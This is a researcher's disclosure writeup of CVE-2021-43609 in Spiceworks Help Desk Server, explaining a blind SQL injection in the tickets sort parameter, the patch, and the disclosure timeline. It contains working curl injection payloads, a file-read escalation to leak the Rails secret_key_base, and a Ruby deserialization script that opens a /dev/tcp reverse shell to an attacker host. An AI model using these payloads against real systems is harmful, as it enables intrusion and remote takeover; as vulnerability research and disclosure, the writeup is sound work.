---
layout: post
title: CVE-2021-43609 Writeup
author: Aidan Stansfield
date: 2021-11-04 11:30
tags: [spiceworks, sqli, ruby, fails, deserialization, rce, cve]
---

# About Spiceworks Help Desk Server

This application comes in both an on-premises and cloud hosted package. Due to the Spiceworks terms of use, I performed my research upon the on-premises application, so that I was only attacking my own infrastructure and data.

The on-premises application is called Spiceworks Help Desk Server (HDS), and is packaged into an Open Virtual Appliance (OVA) file that can be run with various virtualization technologies. The main purpose of the application is to facilitate IT support, allowing users to submit 'tickets' to the help desk such that an agent can look at the ticket and provide appropriate help to the user.

Exploring inside the OVA file, I located the Spiceworks HDS application and found it to be a Ruby on Rails application. This was great news as it simplified the vulnerability research process since the source code is provided and does not need to be decompiled.

# Identifying SQL Injection

Whilst performing source code review, I identified a SQL Injection vulnerability in `/opt/tron/embedded/service/tron-rails/app/models/reporting/database_query.rb`. The vulnerable function, `order_by_for_ticket` can be found below (with some irrelevant code removed for the sake of brevity). The purpose of this function is to order a list of tickets based upon a specific column and direction (e.g., order the tickets by the date submitted).

```ruby
def order_by_for_ticket(order, dir)
	@scope = if order == 'organization'
		order = "lower(organizations.name) #{dir}" # we can inject in 'dir'

		explain('.joins(:organization)')
		@scope.joins(:organization)
	elsif order == 'assignee'
		order = "lower(users.first_name) #{dir}, lower(users.last_name) #{dir}" # we can inject in 'dir'

		explain('.joins("LEFT OUTER JOIN users ON tickets.assignee_id = users.id")')
		@scope.joins('LEFT OUTER JOIN users ON tickets.assignee_id = users.id')
	elsif order == 'creator'
		... snip ...
	else
		order += " #{dir}" # we can inject in 'dir' OR 'order' since dir is appended to user supplied order
		@scope
	end
	order = Arel.sql(order)
	explain(".order(#{order})")
	@scope = @scope.order(order) # here is the SQLi vuln
end
```

Here we see that if the attacker can control the 'order' and 'dir' parameters to this function, then they can control the SQL that is passed to the '@scope.order' function. This can be abused to perform Blind Boolean SQL injection. 

# Path from request to vulnerable function

Before delving into the SQL injection, it's important to first see where and how this function is called. 

Checking for references to this function, we see it is called by the `order_by` function as defined below:

```ruby
# applies an ordering to the query
# see #normalize_order
def order_by(order_obj)
	return self if order_obj.blank?

	@order = normalize_order(order_obj)
	order = @order.first
	dir = @order.last

	if @initial_scope.klass == Ticket
		order_by_for_ticket(order, dir) # < order_by_for_ticket
	else
		order_param = "#{order} #{dir}"
		explain('.order(%s)', order_param)
		@scope = @scope.order(order_param)
	end

	self
end
```

The `normalize_order` function takes an order object and normalizes it into the format `['sort', 'direction']`. It does this by splitting the order objects on spaces or hyphens, which we will keep a note of for later. The `order_by` function is called from within the `index` function of the `/opt/tron/embedded/service/tron-rails/app/controllers/api/tickets_controller.rb` file, which defines the `/api/tickets` route. This function can be seen below:

```ruby
def index
	filter_hash = begin
		params[:filter].permit!.to_h
	rescue StandardError
		{}
	end

	if params[:q].present?
		@tickets = Reporting::SearchQuery.new(
			current_user.accessible_tickets_for_search,
			mappings: default_mappings
		).query(params[:q])
	else
		@tickets = Reporting::DatabaseQuery.new(current_user.accessible_tickets, mappings: default_mappings)
	end

	@tickets.filter(filter_hash)
		.order_by(params[:sort] || {ticket_number: :desc}) # < order_by is called here
	... snip ...

	render json: @tickets, each_serializer: TicketsListSerializer
end
```

To summarize, the SQL injection can be reached by requesting the `/api/tickets` endpoint with a `sort` query string parameter. This will call the `order_by` function, which normalizes the `sort` query string parameter to extract the column name and direction, before passing them over to the vulnerable `order_by_for_ticket` function. This means that any `agent` or `admin` user is able to execute this SQL injection.

# Executing SQL Injection

By adding some debug statements into the source code, it was possible to identify the underlying SQL query that is run. Requesting the `/api/tickets?sort=order+direction+junk` endpoint, we see the following SQL statement is made:

```sql
SELECT "tickets".* FROM "tickets" INNER JOIN "organizations" ON "tickets"."organization_id" = "organizations"."id" WHERE "tickets"."type" IN ('Ticket') AND "organizations"."account_id" = $1 AND (tickets.assignee_id = 3 OR tickets.creator_id = 3 OR tickets.id in (NULL)) ORDER BY order direction LIMIT $2 OFFSET $3
```

Note that 'junk' does not appear anywhere within the SQL statement. This is because the `normalize_order` function splits the `sort` query string parameter based upon spaces or hyphens, and assigns the first two items to the order and direction respectively. Therefore, we cannot use spaces or hyphens in our payload. To get around this, we can replace spaces with SQL comments (e.g., `/**/`). Requesting `/api/tickets?sort=order/**/direction/**/junk` results in the following SQL statement:

```sql
SELECT "tickets".* FROM "tickets" INNER JOIN "organizations" ON "tickets"."organization_id" = "organizations"."id" WHERE "tickets"."type" IN ('Ticket') AND "organizations"."account_id" = $1 AND (tickets.assignee_id = 3 OR tickets.creator_id = 3 OR tickets.id in (NULL)) ORDER BY order/**/direction/**/junk asc LIMIT $2 OFFSET $3
```

Notice that 'junk' now appears within the payload, and a default direction of 'asc' is assigned since our payload did not contain any spaces or hyphens. Since we only control the `ORDER BY` parameter, we cannot simply leak arbitrary database results directly into the page. However, as alluded to earlier, we can achieve Blind Boolean based injection to leak arbitrary data. Consider the following SQL statement:

```sql
SELECT x FROM y WHERE z ORDER BY (SELECT CASE WHEN ($condition) THEN 1 ELSE 1/(SELECT 0) END) asc
```

When `$condition` is true, the select case statement will return 1, and so the results will be ordered by the 1st column. When `$condition` is false however, the select case statement will return `1/(SELECT 0)`, which will cause a division by zero error within the database and cause the application to return a 500 internal server error.

For example, setting the condition to `1=1` will return true, and a 200 response code:

```bash
$ curl "https://$IP/api/tickets?sort=(SELECT/**/CASE/**/WHEN/**/(1=1)/**/THEN/**/1/**/ELSE/**/1/(SELECT/**/0)/**/END)" -H "Cookie: $COOKIES" -k --head -s | head -n1
HTTP/1.1 200 OK
```

Whereas setting the condition to `1=2` will return false, and a 500 response code:

```bash
$ curl "https://$IP/api/tickets?sort=(SELECT/**/CASE/**/WHEN/**/(1=2)/**/THEN/**/1/**/ELSE/**/1/(SELECT/**/0)/**/END)" -H "Cookie: $COOKIES" -k --head -s | head -n1
HTTP/1.1 500 Internal Server Error
```

# Escalating to RCE

Since the database user possesses 'super' privileges, this SQL injection can be used to read arbitrary local files with the `pg_read_file` PostgreSQL command. A particular file of interest is the environment configuration file, which details all of the environment variables and secrets used by the Rails application. This file can be found at the following location: `/var/opt/tron/etc/env`.

Included in this configuration is the `secret_key_base`, which is a secret used to sign all serialized cookies. Once the `secret_key_base` is leaked from the environment configuration, an attacker can send specially crafted requests and gain remote code execution through deserialization of signed malicious data.

The ability to force a Rails application to deserialize arbitrary code after the disclosure of the `secret_key_base` is considered part of the intended internal functionalities of Rails applications and is not a separate vulnerability within the Spiceworks codebase. For technical discussion of this technique and why it is considered an intended internal functionality, see the below disclosure:

- <https://hackerone.com/reports/473888>

Extending upon the information provided within that report, the following payload can be used to send a reverse shell to back to an attacker once the `secret_base_key` is known. This 

```ruby
#!/usr/bin/env ruby
require "base64"
require "erb"
require "./config/environment"
require 'uri'
require 'net/http'

base_url = "https://<RHOST>/rails/active_storage/disk/" # update with victim location

secret_key_base = "<secret_key_base>" # update with leaked secret_key_base
key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
secret = key_generator.generate_key("ActiveStorage")
verifier = ActiveSupport::MessageVerifier.new(secret)
code = '`/bin/bash -c "/bin/bash -i &> /dev/tcp/<LHOST>/<LPORT> 0>&1"`' # update with attacker's IP and PORT
erb = ERB.allocate
erb.instance_variable_set :@src, code
erb.instance_variable_set :@filename, "1"
erb.instance_variable_set :@lineno, 1
dump_target  = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
payload = verifier.generate(dump_target, purpose: :blob_key)

vuln_url = base_url + payload + '/doesnotexist'
uri = URI(vuln_url)
req = Net::HTTP::Get.new(uri.path)
res = Net::HTTP.start(
				uri.host, uri.port,
				:use_ssl => uri.scheme == 'https',
				:verify_mode => OpenSSL::SSL::VERIFY_NONE) do |https|
	https.request(req)
end
```

# The fix

The `order_by_for_ticket` function has been patched in Spiceworks HDS version 1.3.3 by enforcing the 'order' and 'dir' parameters to be one of various set options, as can be seen below:

```ruby
def order_by_for_ticket(order, dir)
	dir = dir == 'desc' ? 'desc' : 'asc' # 'dir' can only be desc or asc
	@scope = case order
		when 'organization'
			order = "lower(organizations.name) #{dir}" # 'dir' can only be desc or asc

			explain('.joins(:organization)')
			@scope.joins(:organization)
		... snip ...
		when 'updated_at'
			order = "updated_at #{dir}" # 'dir' can only be desc or asc
			@scope
		else
			order = "id #{dir}" # 'dir' can only be desc or asc, and order is hardcoded to 'id'
			@scope
		end
	order = Arel.sql(order)
	explain(".order(#{order})")
	@scope = @scope.order(order) # 'order' and 'dir'
end
```

# Summary

CVE-2021-43609 allows an authorized remote attacker to exploit a Blind Boolean SQL injection to read arbitrary data and files, leading to RCE through deserialization techniques inherent to Ruby on Rails. Spiceworks HDS versions < 1.3.3 are vulnerable. A proof of concept (POC) exploit can be found at <https://github.com/d5sec/CVE-2021-43609-POC>. An example of the entire exploit chain can be found below:

[![asciicast](https://asciinema.org/a/yOhUguVcK0brlITWq8t9DLL7J.svg)](https://asciinema.org/a/yOhUguVcK0brlITWq8t9DLL7J)

# Disclosure Timeline

- 02/09/2021 - Vulnerability identified
- 08/09/2021 - Initial reach out to Spiceworks Ziff Davis
- 10/09/2021 - 22/09/2021 - Subsequent attempts to contact Spiceworks Ziff Davis
- 23/09/2021 - Spiceworks Ziff Davis first response
- 23/09/2021 - Vulnerability is reported
- 30/10/2021 - Spiceworks Ziff Davis advises the vulnerability has been remediated
- 13/11/2021 - CVE-2021-43609 is assigned
